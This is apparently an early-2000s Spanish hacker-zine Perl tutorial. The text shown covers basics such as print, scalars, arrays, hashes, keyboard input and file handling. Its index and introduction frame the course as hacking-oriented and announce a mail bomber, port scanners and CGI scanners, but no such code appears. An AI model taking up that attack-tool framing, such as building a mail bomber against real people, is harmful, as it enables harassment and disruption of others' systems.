


                        -+-| DisidentS Hack Journal #3 |-+-







  ________________________________________________________________________
 |                                                                        |
 |  -+- Titulo_____: PERL A DOLOR 1ª EDICION  [001.txt]                   |
 |  -+- Autor______: DDiego (Editor)                                      |
 |  -+- E-Mail_____: <diegorba@yahoo.es> - <disidents@yahoo.es>           |
 |  -+- Team_______: DISIDENTS ESPAÑA 2002 -  LOS FUERA DE LA LEY         |
 |  -+- KB_________: 221.8                                                |
 |  -+- Tema_______: Artesania en perl                                    |
 |________________________________________________________________________|





.==========================================================================.
|===========~ INDICE ~======================================================
|===========================================================================
|=~ 1.0.0  INTRODUCCION                                                    |
|=~ 2.0.0  QUE NECESITO?                                                   |
|=~ 3.0.0  COMENTARIOS                                                     |
|=~ 3.1.0  EJECUCION DE UN SCRIPT DE PERL                                  |
|=~ 4.0.0  PRINT                                                           |
|=~ 4.1.0  PRINTF                                                          |
|=~ 4.2.0  SPRINTF                                                         |
|=~ 5.0.0  VARIABLES                                                       |
|=~ 5.1.0  ESCALARES                                                       |
|=~ 5.2.0  ARREGLOS                                                        |
|=~ 5.3.0  HASHES                                                          |
|=~ 5.4.0  ENTRADAS POR TECLADO                                            |
|=~ 5.5.0  ENTRADAS POR TECLADO - CHOP                                     |
|=~ 5.5.1  ENTRADAS POR TECLADO - CHOMP                                    |
|=~ 5.6.0  STDOUT                                                          |
|=~ 6.0.0  JUGANDO CON ARCHIVOS                                            |
|=~ 6.0.1  RENOMBRANDO ARCHIVOS                                            |
|=~ 6.0.2  ESTADO DE UN ARCHIVO STAT                                       |
|=~ 6.1.0  ABRIR ARCHIVOS                                                  |
|=~ 6.1.1  ABRIR ARCHIVOS - SYSOPEN                                        |
|=~ 6.2.0  CERRAR ARCHIVOS                                                 |
|=~ 6.3.0  ABRIR UN PROCESO                                                |
|=~ 6.4.0  CERRAR UN PROCESO                                               |
|=~ 6.5.0  DIRECTORIOS                                                     |
|=~ 6.5.1  ABRIR Y CERRAR DIRECTORIOS                                      |
|=~ 6.5.2  GESTIONAR DIRECTORIOS                                           |
|=~ 7.0.0  OPERADORES                                                      |
|=~ 8.0.0  LLAMADAS AL SISTEMA                                             |
|=~ 9.0.0  BUCLES                                                          |
|=~ 9.1.0  BUCLE WHILE                                                     |
|=~ 9.2.0  BUCLE FOR                                                       |
|=~ 9.2.1  JUGANDO CON NET SEND                                            |
|=~ 9.3.0  CONDICION CON IF                                                |
|=~ 9.3.1  CONDICION ?:                                                    |
|=~ 9.4.0  FOREACH                                                         |
|=~ 10.0.0 VARIABLES ESPECIALES                                            |
|=~ 11.0.0 SUBRUTINAS                                                      |
|=~ 12.0.0 JUGANDO CON EL TEXTO                                            |
|=~ 13.0.0 CREACCION DE UN CREADOR DE DICCIONARIOS                         |
|=~ 14.0.0 MANIPULANDO UNA VARIABLE GLOBAL                                 |
|=~ 15.0.0 SPLIT                                                           |
|=~ 16.0.0 JUGANDO CON BINARIOS                                            |
|=~ 17.0.0 DIE WARN- LA MATANZA Y LA ALERTA                                |
|=~ 18.0.0 ARGUMENTOS DE UN PROGRAMA                                       |
|=~ 19.0.0 VARIABLES LOCALES Y GLOBALES "local y my"                       |
|=~ 20.0.0 GOTO                                                            |
|=~ 21.0.0 MENU                                                            |
|=~ 22.0.0 BEGIN END                                                       |
|=~ 23.0.0 COMUNICACION ENTRE PROCESOS                                     |
|=~ 24.0.0 ALARMAS Y TEMPORIZADORES                                        |
|=~ 25.0.0 TRUNCANDO ARCHIVOS                                              |
|=~ 26.0.0 RESET                                                           |
|=~ 27.0.0 JUGANDO CON LOS NUMEROS                                         |
|=~ 28.0.0 COLORES                                                         |
|=~ 29.0.0 REFERENCIAS                                                     |
|=~ 30.0.0 CRYPT                                                           |
|=~ 31.0.0 GETC                                                            |
|=~ 32.0.0 GMTIME                                                          |
|=~ 33.0.0 LOCALTIME                                                       |
|=~ 34.0.0 MODULOS EN PERL                                                 |
|=~ 35.0.0 MODULO IO::Socket                                               |
|=~ 35.1.0 CLIENTE                                                         |
|=~ 35.2.0 SERVIDOR                                                        |
|=~ 36.0.0 CREANDO UN  MAIL BOMBER                                         |
|=~ 37.0.0 CREANDO UN PORT MONITOR                                         |
|=~ 38.0.0 CREANDO NUESTRO PROPIO SCANNER DE PUERTOS                       |
|=~ 38.1.0 CREANDO UN SCANNER DE PUERTOS CON OPCION DE ESCANEAR RANGOS     |
|=~ 39.0.0 CREANDO  UNA CONSOLA PARA CGIS                                  |
|=~ 40.0.0 CREANDO UN SCANNER DE CGIS                                      |
|=~ 40.1.0 CREANDO UN SCANNER DE CGIS CON SOPORTE PARA USA UN PROXY        |
|=~ 41.0.0 QUEEEE QUE EN LA CONSOLA DE CGIS TAMBIEN QUIERES USAR PROXY     |
|=~ 42.0.0 __DATA__ Y __END__                                              |
|=~ 43.0.0 DEFINED                                                         |
|=~ 44.0.0 READ Y SYSREAD LEYENDO UNOS BYTES                               |
|=~ 45.0.0 SYSWRITE ESCRIBIENDO UNOS BYTES                                 |
|=~ 46.0.0 SYSSEEK Y SEEK                                                  |
|=~ 47.0.0 TELL & TELLDIR                                                  |
|=~ 48.0.0 RETURN                                                          |
|=~ 49.0.0 SELECT                                                          |
|=~ 50.0.0 STUDY                                                           |
|=~ 51.0.0 TIME                                                            |
|=~ 52.0.0 UTIME                                                           |
|=~ 53.0.0 REPITIENDO CON x                                                |
|=~ 54.0.0 PERL2EXE                                                        |
|=~ 55.0.0 LINKS INTERENSANTES                                             |
|=~ 56.0.0 LIBROS RECOMENDADOS                                             |
|=~ 57.0.0 NOTAS FINALES                                                   |
|=~ 58.0.0 SALUDOS                                                         |
|=~ 59.0.0 CONTACTO                                                        |
|=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=.
======================================================~ INDICE ~============
============================================================================



.==========================================================================.
|=======~ 1.0.0 INTRODUCCION ~==============================================
|===========================================================================


- Hace cientos de años un noble caballero ansiaba tener la mejor espada, una
  espada a su medida que la manejara como si unida a su cuerpo estubiera, no
  habia artesano que le diera la calidad, ligereza y perfeccion que  el bus-
  caba, tal llego su desesperacion que el  noble caballero  decidio crear su
  propia espada a imagen y semejanza de la espada por la que su mente estaba
  atormentada y que el tanto ansiaba.

- Nosotros vamos a empezar a hacer nuestras espadas,  y dejarnos de usar las
  hechas por otros, si es eso  lo que buscas sigue leyendo y  comienza a ser
  noble artesano inmerso en el codigo cada vez mas si estas cansado de  usar
  herramientas y no saber realmente como funcionan por aqui se empieza, nada
  es facil hay que trabajarlo pero lo conseguiremos ;).
  PERL A DOLOR 1ª EDICION, si esta es la 1ª parte de un  articulo que me  ha
  llevado su tiempo, espero que lo disfruteis, nunca  pense que iba a alcan-
  zar este tamaño, bueno que podeis encontrar en este articulo  guia  o casi
  un libro, pues encontrareis mis modestos conocimientos y mi humilde apren-
  dizaje en perl gracias a la informacion que he encontrado en la red,  y en
  algunos libros, la guia comienza desde perl desde cero,  hasta como reali-
  zar tus  propias herramientas desde scaners de cgis normales o con  opcion
  de usar proxy, scaners de puertos, monitores de puertos, un mail bomba etc
  , hasta abriros  camino hacia crear mas  herramientas, si estas cansado de
  usar herramientas enlatadas,sigue leyendo os guiare por un tipo de progra-
  macion orientada al hacking completamente y con posibilidad de usar  vues-
  tras creacciones en varias  plataformas eso  es fantastico  para cualquier
  programador la portabilidad de sus herramientas a otros OS.






.==========================================================================.
|=======~ 2.0.0  QUE NECESITO ~=============================================
|===========================================================================


- Que necesito, pues un compilador y un editor de textos, os vale el wordpad
  , block de notas a los usuarios de windows, tambien podeis pasaros por (ht
  tp://www.activestate.com) y  bajaros el active perl o os  pasais todos di-
  rectamente  por esta direccion:  (http://www.perl.com/pub/a/language/info/
  software.html), encontrareis todo el   software necesario, los usuarios de
  linux pueden pasarse por ahi o fijo que ya lo tienen en los cds de su dis-
  tribucion, o incluso ya lo tienen instalado, para ver la version que tien-
  en se pone "perl -v" en la consola sin las comillas claro ;).






.==========================================================================.
|=======~ 3.0.0 COMENTARIOS ~===============================================
|===========================================================================


- Bueno voy a empezar por lo mas basico y facil, los comentarios o anotacio-
  nes dentro del codigo del programa, por una parte  pensaras que no son in-
  dispensables pero si lo son en realidad, en otros lenguajes como c,  java,
  etc... si que es mas necesario debido a las dimensiones que puede llegar a
  tener un programa, pero en perl no esta mal hacer estas  anotaciones  para
  posteriores implementaciones,  si dentro de un año vuelves a ver el codigo
  del programa, te sea util para saber los pasos que has dado,  los comenta-
  rios en perl vienen detras de la almoadilla #, asi por ejemplo:  # Esto es
  un comentario en perl .






.==========================================================================.
|=======~ 3.1.0 EJECUCION DE UN SCRIPT DE PERL ~============================
|===========================================================================


- Esto es facil, solamente tienes que poner perl nombredeprograma.pl y ya se
  ejecutara sin problemas,  mas adelante veremos que se pueden dar mas argu-
  mentos a un programa.


- Otra forma de ejecutar perl es desde la linea de comando, algo asi:
  perl -e 'comando';

  * veamos un ejemplo:

     [root@localhost fork]# perl -e 'print "hola\n";'
     hola


   o mas de un comando:

    [root@localhost fork]# perl -e 'print "hola\n";print "adios\n";'
    hola
    adios






.==========================================================================.
|=======~ 4.0.0 PRINT ~=====================================================
|===========================================================================


- Que queremos que salgan nuestros comentarios locos en la pantalla???, pues
  recurriremos a print,  esto lo usaremos ya sea para hacer preguntas  tipo,
  que "server vamos a escanear?","a quien quieres tirar abajo?", "hola mundo
  paralelo", bueno cosas asi rutinarias de todo los dias.


  Ejemplo:

    #!/usr/bin/perl
    print "hola, estoy en un mundo paralelo, quieres subir a mi nave
    espacial?\n";




- Ahora lo guardas es nave.pl y:

  [root@localhost articulo]# perl print.pl
  hola, estoy en un mundo paralelo, quieres subir a mi nave espacial?





- Al final de cada  expresion vemos un  ; esto es necesario, no los olvideis



- Las comillas es otro factor importante hay comillas simples ' y  dobles ",
  a la hora de asignar valores no hay diferencia  da igual $numero= '2'  que
  $numero= "2", pero a la hora de imprimirlo si veremos porque:

    #!/usr/bin/perl
    $numero="19";
    print "$numero\n";


  SALIDA:

    [root@localhost articulo]# perl print2.pl
    19



- Bien pero que pasa si usamos las simples ' :

    #!/usr/bin/perl
    $numero=19;
    print 'El numero es $numero\n';

  SALIDA:

    El numero es $numero\n



- Imprime segun escribes el code -

    #!/usr/bin/perl
    print "Hola que tal
    estas hoy??? \n";

  SALIDA:

    [root@localhost articulo]# perl imprime.pl
    Hola que tal
    estas hoy???




- Tambien podemos agregar funciones del sistema por ej la hora -


  * Con localtime () podremos averiguar la hora:

    #!/usr/bin/perl
    $hora= 'Son las ' . localtime() ."\n";
    print "$hora\n";


  SALIDA:

    [root@localhost articulo]# perl hora.pl
    Son las Mon Nov 26 16:58:31 2001


  * Es posible poner directamente:

    print 'Son las ' . localtime() ."\n";




- Tambien puedes ver  contrucciones como esta:

    #!/usr/bin/perl
    print "hola ddiego\n" , "que tal estas\n";

  SALIDA:

    [root@localhost articulo]# perl constr.pl
    hola ddiego
    que tal estas






.==========================================================================.
|=======~ 4.1.0 PRINTF ~====================================================
|===========================================================================


- En algunos casos es necesario usar printf, sobre todo para numeros decima-
  les por ej, numeros en coma flotante, veamos como se usa es facil:

   #!/usr/bin/perl
   printf "%f\n",5.148499;  #%f de float




 * Veamos una tabla indicadores de  printf:

  %f  = Notacion decimal, coma flotante "float"
  %d  = Entero con signo, nº decimal
  %ld = nº decimal largo
  %u  = nº decimal sin signo
  %x  = hexadecimal
  %lx = nº hexadecimal largo
  %X  = hexadecimal con mayusculas
  %o  = nº octal
  %lo = nº octal largo
  %s  = Cadena o string
  %c  = un caracter del codigo ASCII
  %p  = Puntero
  %e  = Notacion cientifica
  %%  = signo de porcentaje






.==========================================================================.
|=======~ 4.2.0 SPRINTF ~===================================================
|===========================================================================


- printf sirve para dar formato a una cadena, funciona igual que la  funcion
  sprintf en c, veamos sprintf con un ejemplo:

  Ejemplo:

   #!/usr/bin/perl
   $cadena = "Disidents";
   $tamano = 10;
   $formateo1 = sprintf("%s", $cadena);
   print "$formateo1\n";
   $formateo2 = sprintf("-%s-", $cadena);
   print "$formateo2\n";
   $formateo3 = sprintf("- %s HACKER TEAM -", $cadena);
   print "$formateo3\n";
   $formateo4 = sprintf("-%15s-", $cadena);
   print "$formateo4\n";
   $formateo5 = sprintf("-%-15s-", $cadena);
   print "$formateo5\n";
   $formateo6 = sprintf("-%-${tamano}s-", $cadena);
   print "$formateo6\n";
   $formateo7 = sprintf("-%+${tamano}s-", $cadena);
   print "$formateo7\n";


  SALIDA:

   Disidents
   -Disidents-
   - Disidents HACKER TEAM -
   -      Disidents-
   -Disidents      -
   -Disidents -
   - Disidents-






.==========================================================================.
|=======~ 5.0.0 VARIABLES ~=================================================
|===========================================================================


.==========================================================================.
|=======~ 5.1.0 ESCALARES ~=================================================
|===========================================================================


- Este tipo de variables lleva delante el signo $, pueden almacenar numeros,
  cadenas de texto o "strings":

  Ejemplo:

   #!/usr/bin/perl
   $x=1; #da a x el valor de 1
   $y=2; #da a y el valor de 2
   $z=$x+$y;  # x + y = z -> 1+2=z=3
   print "x + y es $z\n";

  SALIDA:

   [root@localhost articulo]# perl escalar.pl
   x + y es 3


- Hablaremos mas adelante de un tipo muy especial de escalar $_






.==========================================================================.
|=======~ 5.2.0 ARREGLOS ~==================================================
|===========================================================================


- Aqui se meten varias variables y lleva delante el simbolo @,tambien se les
  suelen llamar arrays:

  Ejemplo:

   #!/usr/bin/perl
   @x=(1,3,'hola',7);
   print "@x[3]\n";

  SALIDA:

   [root@localhost articulo]# perl arreglo1.pl
   7


* Si pusieramos  @x solamente asi:

   #!/usr/bin/perl
   @x=(1,3,'hola',7);
   print "@x\n";


  SALIDA:

   [root@localhost articulo]# perl arreglo2.pl
   1 3 hola 7




* Tambien es posible ponerlo de otra forma:

   #!/usr/bin/perl
   $x[0]=1;
   $x[1]=3;
   $x[2]='hola';
   $x[3]=7;
   print "@x[3]\n";


  SALIDA:

   [root@localhost articulo]# perl arreglocambiao.pl
   7



- ARREGLOS DE ARREGLOS -


- Podemos incluir un arreglo dentro de otro arreglo, algo asi:

  Ejemplo:

   #!/usr/bin/perl
   @mas=("spark","vanmore");
   @members=("w3n","leon01",@mas);


  SALIDA:

   [root@localhost articulo]# perl arrarrg1.pl
   w3n leon01 spark vanmore


* Seria lo mismo que

   #!/usr/bin/perl
   @members=("w3n","leon01",("spark","vanmore"));
   print "@members\n";




- Introducir un valor escalar al final del array o arreglo:


   push (@x,$valor);


* Veamos como queda

  Ejemplo:

   #!/usr/bin/perl
   $valor= 2;
   @x=(1,3,'hola',7);
   push (@x,$valor);
   print "@x\n";

  SALIDA:

   [root@localhost articulo]# perl arreglo4.pl
   1 3 hola 7 2



- Ahora vamos a eliminar el ultimo elemento con pop:


  Ejemplo:
   #!/usr/bin/perl
   @x=(1,3,'hola',7);
   pop (@x);
   print "@x\n";

  SALIDA:

  [root@localhost articulo]# perl pop.pl
  1 3 hola


- Se pueden contener dentro de arrays otros arrays y acceder a ellos:

   @array=(@hola,@adios,@buenas);



- Podemos imprimiriamos el primer elemento de @hola poniendo lo siguiente:

   print "@array[0][0]\n";



- Buscar elementos de un array que  empiecen por ciertos caracteres


  Ejemplo:

   #!/usr/bin/perl
   @x=(1,3,'hola','hooo');
   @y = grep /^ho/, @x;     #Busca los  elementos de @x que empicen  por hoy
                            #para ello usa /^
   print "@y\n";


  SALIDA:

   [root@localhost articulo]# perl grep1.pl
   hola hooo



- Ahora vamos a buscar elementos q empiezan por h, H y 3:

  Ejemplo:

   #!/usr/bin/perl
   @x=(1,3,'hola','Holas');
   @y = grep /[HhZ3]/, @x;
   print "@y\n";

  SALIDA:

   [root@localhost articulo]# perl grep2.pl
   3 hola Holas



-  En este caso buscaremos dentro de un array segun que caracteres  esten al
   final de una frase o palabra.


  Ejemplo:

   #!/usr/bin/perl
   @x=(1,3,'hola','hooo');
   @y = grep /a$/, @x;     #Busca los elementos de @x que acaben por a
   print "@y\n";

  SALIDA:

   [root@localhost articulo]# perl grep3.pl
   hola


* Esto tambien se puede usar con escalares

  Ejemplo:

   #!/usr/bin/perl
   $numeros=123456789;
   $numeros=/^123/,$numeros;  #si sale 1 es que en ese caso el escalar
                              #empieza por 1 si sale 0 es

   print "$numeros\n";        #el caso contrario


  SALIDA:

   [root@localhost articulo]# perl verdadero.pl
   1





- SPLICE -


- Con splice lo que haremos  es extraer,  elementos de un arreglo y meterlos
  en otro arreglo, un ejemplo:

  Ejemplo:

   #!/usr/bin/perl
   @a = ( 'a'..'e');
   @b = splice ( @a, 1, 2);
   #  @b queda con 2 elementos de @a: $a[1] y  $a[2];
   #       ( 'b', 'c')
   #  @a queda sin esos 2 elementos:
   #       ( 'a', 'd', 'e' )
   print "@a\n";
   print "@b\n";


  SALIDA:

   [root@localhost articulo]# perl splice1.pl
   a d e
   b c



- Sustitucion con splice -


- Es posible sustituir elementos con splice de otra forma:

  Ejemplo:

   #!/usr/bin/perl
   @a = ( "Rah3", "w3n", "DDiego", "leon01");
   @b = ("S-P-A-R-K", "Vanmore");
   @c = splice  @a, 1, 2, @b; #Sustituye a partir del primer "1" elemento de
                              #@a, tomando solo 2 elementos
   print "@a\n";#imprime el array @b, han sido sustituidos 2 elementos a
                #partir de $a[1]
   print "@b\n";
   print "@c\n"; #Imprime los elementos que se han sustituido en el primer
                 #array


  SALIDA:

   [root@localhost articulo]# perl splice2.pl
   Rah3 S-P-A-R-K Vanmore leon01
   S-P-A-R-K Vanmore



- Si pusiesemos que empezara a  partir  del 2º elemento y tomara 3  elemento
  saldria algo asi:

  Ejemplo:

   #!/usr/bin/perl
   @a = ( "Rah3", "w3n",  "leon01", "hah","jojo","jeje");
   @b = ("S-P-A-R-K", "Vanmore");
   @c = splice  @a, 2, 3, @b;
   print "@a\n";#imprime el array @b pero han sido sustituidos 3 elementos a
                #partir de $a[2]
   print "@b\n";
   print "@c\n"; #Imprime los elementos que se han sustituido en el primer
                 #array



  SALIDA:

   [root@localhost articulo]# perl splice3.pl
   Rah3 w3n S-P-A-R-K Vanmore jeje
   S-P-A-R-K Vanmore
   leon01 hah jojo
   w3n DDiego






- Eliminar el primer elemento de un arreglo "shift" -


  Ejemplo:

   #!/usr/bin/perl
   @members=("w3n","leon01", "spark","vanmore");
   shift(@members);
   print "@members\n";




* Ahora w3n no saldra al imprimir el arreglo


  SALIDA:

   [root@localhost articulo]# perl shift.pl
   leon01 spark vanmore





-  Sustituir el primer elemento de un arreglo "unshift" -


   Ejemplo:

    #!/usr/bin/perl
    @members=("w3n","leon01", "spark","vanmore");
    unshift(@members,"damicita");
    print "@members\n";



* Ahora w3n pasara al segundo de la lista


SALIDA:

[root@localhost articulo]# perl unshift.pl
damicita w3n leon01 spark vanmore



- Entrecomillar palabras de forma automatica -


* Solo necesitamos qw para hacerlo:

  Ejemplo:

   #!/usr/bin/perl
   @members=qw/w3n leon01 spark vanmore/;
   unshift(@members,"damicita");
   print "@members\n";

  SALIDA:

   * Igual que arriba.

   [root@localhost articulo]# perl qw.pl
   damicita w3n leon01 spark vanmore






.==========================================================================.
|=======~ 5.3 HASHES ~======================================================
|===========================================================================


- Estas llevan  delante el simbolo de porcentaje %,  este tipo  de variables
  son tambien llamadas matrices asociativas, veremos que es esto:



  Ejemplo:

   #!/usr/bin/perl
   %z=('x',1,'y',2); #asocia x a 1   ,   y a 2
   print $z{'x'};

  SALIDA:

   [root@localhost articulo]# perl hash1.pl
   1[root@localhost articulo]#


* Para que salga mejor

   print "$z{'x'}\n";

   [root@localhost articulo]# perl hash2.pl
   1

* queda mejor no??



- Debemos aclarar algunos terminos,como que son las claves y el valor, en
  el caso anterior las claves o keys serian x e y u los valores 1 y dos.


* Es posible usar  => en vez de la coma, asi se ve mas claro:

  Ejemplo 1:
   #!/usr/bin/perl
   %z=('x'=>1,
   'y'=>2
   );
   print $z{'x'};




  Ejemplo 2:

   #!/usr/bin/perl
   @x=('1'..'5');
   print $x[2];  #Vemos que $x[0] seria 1 y $x[4] seria 5

  SALIDA:

   [root@localhost articulo]# perl hash3.pl
   3



- Con letras lo mismo -

  Ejemplo:

   #!/usr/bin/perl
   @x=('a'..'d');
   print $x[2];

  SALIDA:

   [root@localhost articulo]# perl hash4.pl
   c



- Si pusiesemos valores negativos tipo $x[-1] saldria d -


  Ejemplo:

   #!/usr/bin/perl
   @x=('a'..'d');
   print $x[-1];

* Volvamos a las hashes o matrices asociadas de nuevo, y veamos como funcio-
  nan:


- Mostrar los valores del hash "values": -

  Ejemplo:

   #!/usr/bin/perl
   %z=('x',1,'y',2);
   print values(%z);


- Mostrar las claves de un hash "keys" -

  Ejemplo:

   #!/usr/bin/perl
   %z=('x',1,'y',2);     # x  e y son las claves que mostrara
   print keys(%z);



- Borrar las  claves   de un hash con "delete" -

  Ejemplo:

   #!/usr/bin/perl
   %z=('x',1,'y',2);
   delete($z{'y'});
   print "%z\n";



- Saber cuantas entradas hay -

  Ejemplo:
   #!/usr/bin/perl
   %z=('x',1,'y',2);
   $entradas = scalar keys %z;
   print "$entradas\n";

  SALIDA:

   [root@localhost arti]# perl entradas.pl
   2



- Comprobar que existe una clave -

* Para ello usaremos exists

  Ejemplo:

   #!/usr/bin/perl
   %hash=('a'=>1,
          'b'=>2,
          'c'=>3,
          'd'=>4,
          'e'=>5,
          'f'=>6
         );
  if (exists $hash{a}){  #sintaxis: exists $nombredehash{clave}
                       print "a existe \n";
                      }
                      else
                      {
                       print "a no existe\n";
                      }


  SALIDA:

   [root@localhost articulo]# perl exists1.pl
   a existe


* Otro ejemplo:

   #!/usr/bin/perl
   %hash=('a'=>1,
          'b'=>2 ,
          'c'=>3 ,
          'd'=>4 ,
          'e'=>5 ,
          'f'=>6
         );

   $buscar=exists $hash{d};
   print "$buscar\n";

* La salida o da un valor verdadero 1 o falso 0

  SALIDA:

   [root@localhost articulo]# perl exists2.pl
   1



- Hash dentro de hash -


* Tambien es posible encontrar una estructura hash dentro de otra:


  Ejemplo:

   #!/usr/bin/perl
   %disidents=('miembros' => {
                              'w3ndig0'=>'españa',
                              'S-P-A-R-K'=>'argentina',
                              'leon01'=>'argentina',
                             },
               'amigos' =>   {
                              'genl0g'=>'ganimedes',
                              'madbiker'=>'raticuli',
                             }
              );



- Es posible ordenar una extructura hash de forma aleatroia gracias a each -


  Ejemplo::

   #!/usr/bin/perl
   %hash=('a'=>1,
          'b'=>2,
          'c'=>3,
          'd'=>4,
          'e'=>5,
          'f'=>6
          );

   while (($key, $valor) =each(%hash))
                                      {
                                        print "$key=$valor\n";
                                      }


  SALIDA:

   [root@localhost articulo]# perl each.pl
   e=5
   f=6
   a=1
   b=2
   c=3
   d=4






.==========================================================================.
|=======~ 5.4.0 ENTRADAS POR TECLADO ~======================================
|===========================================================================


- Si queremos que  un programa sea interactivo por parte del usuario, y  que
  este programa pueda recoger cierta informacion, usaremos <STDIN> "STanDart
  INput"


  Ejemplo:
   #!/usr/bin/perl
   print "Cual es tu nombre?? ";
   $nombre = <STDIN>;
   print "Hola $nombre\n";

  SALIDA:

   [root@localhost articulo]# perl entrada.pl
   Cual es tu nombre?? DDiego
   Hola DDiego






.==========================================================================.
|=======~ 5.5.0 ENTRADAS POR TECLADO - CHOP ~===============================
|===========================================================================


- Usaremos chop para quitar el ultimo caracter a simple vista no tiene mucha
  utilidad pero nos vendra bien para las entradas por teclado <STDIN>.


* Si ponemos:

   #!/usr/bin/perl
   $comentario = "Soy DDiego";
   print $comentario;

   Saldria: Soy DDieg


* Veremos que para STDIN si tiene utilidad



* Si no se usa chop en una entrada tambien se coge el caracter enter pulsado


  Ejemplo:

   #!/usr/bin/perl
   $comentario = <STDIN>;
   print "acabas de escribir $comentario en la consola\n";


  SALIDA:

   [root@localhost articulo]# perl nochop.pl
   hola
   acabas de escribir hola
   en la consola


* umm no queda muy bien, para evitar eso usaremos chop


  Ejemplo:

   #!/usr/bin/perl
   $comentario = <STDIN>;
   chop $comentario;
   print "acabas de escribir $comentario en la consola\n";

  SALIDA:

   [root@localhost articulo]# perl conchop.pl
   hola
   acabas de escribir hola en la consola


-> Ahora mejor






.==========================================================================.
|=======~ 5.5.1 ENTRADAS POR TECLADO - CHOMP ~==============================
|===========================================================================


- Vemos que chop lo unico que hace es quitar el ultimo caracter y que se in-
  troduce y nos vale para quitar el retorno de carro \n, chomp hace lo mismo
  y despues nos devuelve el numero de caracteres que se ha eliminado, veamos
  como rula:


  Ejemplo:

   #!/usr/bin/perl
   print "Introduce un comentario: ";
   $comentario = <STDIN>;
   $salida= chomp ($comentario);
   print "$salida\n";

  SALIDA:

   [root@localhost articulo]# perl chomp.pl
   Introduce un comentario: hola
   1






.==========================================================================.
|=======~ 5.6.0 STDOUT ~====================================================
|===========================================================================


- STDOUT "Salida standart", normalmente la salida standart es la pantalla -

  Ejemplo:

   #!/usr/bin/perl
   print STDOUT "Hola DDiego\n";


  SALIDA:

   [root@localhost articulo]# perl stdout.pl
   Hola DDiego






.==========================================================================.
|=======~ 6.0.0 JUGANDO CON ARCHIVOS ~======================================
|===========================================================================


- En este apartado trataremos sobre como manipular archivos,abrir, leer, es-
  cribir, cerrar etc.






.==========================================================================.
|=======~ 6.0.1 RENOMBRANDO ARCHIVOS ~======================================
|===========================================================================


- Para renombrar archivos usamos-> sintaxis:rename ("nombredelarchivo","nom-
  brenuevo");  , veamos un ejemplo:


  Ejemplo:

   #!/usr/bin/perl
   rename ("disidents.txt", "disidentshackerteam.txt");






.==========================================================================.
|=======~ 6.0.2 ESTADO DE UN ARCHIVO STAT ~=================================
|===========================================================================


- Gracias a stat podemos saber las propiedades de un archivo -

  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,'>disidents.txt')
   or die ("no se ha podido encontrar el archivo");
   ($device, $inode, $infoarch, $links, $IDUsuario, $IDGrupo, $IDdevice,
   $Tamano,$ultacces,$ultmodif,$ultiinode,$tambloqueIO, $IO)= stat (ARCHIVO);
   close (ARCHIVO);
   print "$device\n"; #Dispositivo donde se encuentra el archivo
   print "$inode\n";  #Nº de refrencia interna
   print "$infoarch\n"; #Tipo y permisos de archivo
   print "$links\n";    #vinculos establecidos en el archivo
   print "$IDUsuario\n";#ID del propietario del archivo
   print "$IDGrupo\n";  #ID del grupo del propietario del archivo
   print "$IDdevice\n"; #Identificador del tipo de dispositivo
   print "$Tamano\n";   #Tamaño del archivo
   print "$ultacces\n"; #Ultimo acceso al archivo
   print "$ultmodif\n"; #Ultima modificacion al archivo
   print "$ultiinode\n";#Devuelve la hora en al que se aa cambiado el estado
                        #de un archivo

   print "$tambloqueIO\n"; #Tamaño preferido de bloque para las operaciones
                           #de entrada y salida "I/O"
   print "$IO\n"; #Tamaño real del blioeuq para todas las
                  #operaciones de entrada y salida "I/O"






.==========================================================================.
|=======~ 6.1.0 ABRIR ARCHIVOS ~============================================
|===========================================================================


- Para abrir un archivo y leerlo usaremos open de esta manera:

   open (ARCHIVO ,"archivo.txt");  #En este caso se abre el archivo en  modo
                                   #lectura nada mas


* Vamos a abrir un archivo e imprimirlo en pantalla:

  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO ,"archivo.txt");
   print (<ARCHIVO>); #asi hacemos uso del descriptor del archivo
                      #"FILEHANDLE" y lo imprimimos


  SALIDA:

   [root@localhost articulo]# perl open1.pl
   wqefqwerewwwrwe
   feqwf
   fqewf




* ARCHIVO  es  la  etiqueta  o  un identificador,  es  un  nombre  que  hace
  referencia a archivo.txt.


  -> archivo.txt es el archivo a abrir


- Para crear un archivo y escribir en el usaremos open tambien pero usaremos
  el simbolo >:

  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,">archivo.txt");

* En este caso creamos el archivo y si ya existe lo sobreescribimos



- Para abrir  un  archivo  en modo  escritura  pero  añadiendo  no  borrando
  su contenido usaremos >> -

  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,">>archivo.txt");




- Para abrir un archivo en modo lectura y escritura usaremos +< -

  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,"+<archivo.txt");



- Para abrir un archivo en modo lectura y escritura pero borrando el archivo
  si ya existe usaremos +> :

  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,"+>archivo.txt");



- Ahora vamos a abrir zz un archivo y imprimir la linea que tenga la palabra
  que buscamos, para ello vamosa a  usar grep un comando que tambien podemos
  ver en unix.


  Ejemplo:

   #!/usr/bin/perl
   print "documento a abrir: ";
   $documento=<STDIN>;
   open (doc, "$documento");
   @lineas = <doc>;
   print join("\n", grep { /ddiego/  } @lineas); #ahora buscara en el
                                                 #archivo la linea que
                                                 #incluye la cadena ddiego


  SALIDA:

   [root@localhost articulo]# perl buscando.pl
   documento a abrir: archivo.txt
   el otro dia ddiego    ....


- En  el  documento archivo.txt inclui esa linea  entre  otras tantas,  solo
  imprime la linea que tiene la cadena ddiego.




- Mandando las salidas de la pantalla a un archivo -

* Para ello usaremos la  funcion open y SECOUT

  Ejemplo:

   open (SECOUT,">&STDOUT");
   open (SECOUT ,">archivo.txt");



- Mandando mensajes de error a un archivo  -

* Es igual que lo de arriba pero con STDERR

  Ejemplo:

   open (SECERR,">&STDERR");
   open (SECERR ,">archivo.txt");



- Errores al abrir -

 Podemos ver la funcion die con mas ejemplos en un apartado mas adelante, si
 el archivo  no esta  disponible el sistema nos dira,  ehh que el archivo no
 esta,pues usaremos la variable $! de esta manera, en esta variable es donde
 se guarda la cadena de error:

  Ejemplo:
   #!/usr/bin/perl
   open (ARCHIVO ,"archivo.gif"),or die "que putada $!\n"; #si no lo puede
                                                           #abrir imprimira
   print (<ARCHIVO>); #no imprime porque no encuentra el archivo


  SALIDA:

   [root@localhost articulo]# perl $!.pl
   que putada No existe el fichero o el directorio




